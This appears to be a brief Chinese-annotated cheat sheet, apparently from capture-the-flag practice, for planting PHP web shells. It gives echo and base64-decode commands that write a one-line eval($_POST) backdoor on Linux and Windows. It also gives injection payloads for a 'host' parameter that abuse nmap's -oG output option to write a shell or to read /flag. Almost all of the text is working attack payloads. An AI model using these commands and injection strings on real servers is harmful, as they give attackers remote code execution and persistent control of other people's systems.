Linux
```
需要转义$
echo "<?php @eval(\$_POST['cmd']); ?>" > ./1.php

echo "PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=" | base64 -d > shell.php
不加-d不解码
```



```
namp参数写文件webshell
?host=' <?php @eval($_POST["cmd"]);?> -oG test.php '
或直接读
?host=' <?php echo `cat /flag`;?> -oG test.php '

?host=' <?= @eval($_POST[1]);?> -oG a.phtml '
```




^
Windows
```
echo ^<?php @eval($_POST[cmd]);?^> > ./1.php
```
